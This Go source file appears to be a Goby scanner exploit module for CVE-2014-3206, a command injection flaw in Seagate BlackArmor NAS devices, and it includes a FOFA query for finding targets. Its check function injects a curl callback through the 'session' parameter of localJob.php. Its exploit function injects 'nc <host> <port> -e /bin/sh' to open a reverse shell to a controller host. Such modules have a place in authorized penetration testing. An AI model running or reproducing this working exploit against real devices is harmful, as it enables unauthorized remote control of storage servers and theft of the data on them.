package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Seagate BlackArmor NAS Unauthenticated Command Execution Vulnerability (CVE-2014-3206)",
    "Description": "<p>Seagate BlackArmor NAS is a network storage server from Seagate, which can provide layered protection, data incremental, and system backup and recovery for business-critical data.</p><p>A security flaw exists in the Seagate BlackArmor NAS. A remote attacker could exploit this vulnerability to execute arbitrary code by sending the 'session' parameter to the localhost/backupmgmt/localJob.php file or the 'auth_name' parameter to the localhost/backupmgmt/pre_connect_check.php file.</p>",
    "Impact": "Seagate BlackArmor NAS Unauthenticated Command Execution Vulnerability (CVE-2014-3206)",
    "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"https://www.seagate.com/\">https://www.seagate.com/</a></p>",
    "Product": "Seagate BlackArmor NAS",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Seagate BlackArmor NAS 未认证命令执行漏洞 (CVE-2014-3206)",
            "Description": "<p>Seagate BlackArmor NAS是美国希捷（Seagate）公司的一款网络存储服务器，它可对业务关键数据提供分层保护、数据增量和系统备份、恢复等。</p><p>Seagate BlackArmor NAS中存在安全漏洞。远程攻击者可通过向localhost/backupmgt/localJob.php文件发送‘session’参数或向localhost/backupmgmt/pre_connect_check.php文件发送‘auth_name’参数利用该漏洞执行任意代码。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：</p><p><a href=\"https://www.seagate.com/\">https://www.seagate.com/</a></p>",
            "Product": "Seagate BlackArmor NAS",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Seagate BlackArmor NAS Unauthenticated Command Execution Vulnerability (CVE-2014-3206)",
            "Description": "<p>Seagate BlackArmor NAS is a network storage server from Seagate, which can provide layered protection, data incremental, and system backup and recovery for business-critical data.</p><p>A security flaw exists in the Seagate BlackArmor NAS. A remote attacker could exploit this vulnerability to execute arbitrary code by sending the 'session' parameter to the localhost/backupmgmt/localJob.php file or the 'auth_name' parameter to the localhost/backupmgmt/pre_connect_check.php file.</p>",
            "Impact": "Seagate BlackArmor NAS Unauthenticated Command Execution Vulnerability (CVE-2014-3206)",
            "Recommendation": "<p>At present, the manufacturer has not released fixes to solve this security problem. It is recommended that users of this software pay attention to the manufacturer's homepage or reference website at any time to obtain solutions:</p><p><a href=\"https://www.seagate.com/\">https://www.seagate.com/</a></p>",
            "Product": "Seagate BlackArmor NAS",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"/admin/layout_design.css\"",
    "GobyQuery": "body=\"/admin/layout_design.css\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.seagate.com/",
    "DisclosureDate": "2018-02-26",
    "References": [
        "https://packetstormsecurity.com/files/163523/Seagate-BlackArmor-NAS-sg2000-2000.1331-Command-Injection.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2014-3206"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201802-608"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "createSelect",
            "value": "shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			uri := "/backupmgt/localJob.php?session=fail;"
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			command := fmt.Sprintf("curl+%s", checkUrl)
			url := fmt.Sprintf("%s%s%%00", uri, command)
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					return godclient.PullExists(checkStr, time.Second*5)
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/backupmgt/localJob.php?session=fail;"
			if ss.Params["AttackType"].(string) == "shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					godServerHost := godclient.GetGodServerHost()
					cmd := fmt.Sprintf("nc %s %s -e /bin/sh", godServerHost, rp)
					cmd = strings.Replace(cmd, " ", "+", -1)
					urls := fmt.Sprintf("%s%s%%00", uri, cmd)
					cfg := httpclient.NewGetRequestConfig(urls)
					cfg.VerifyTls = false
					cfg.Timeout = 10
					cfg.FollowRedirect = false
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
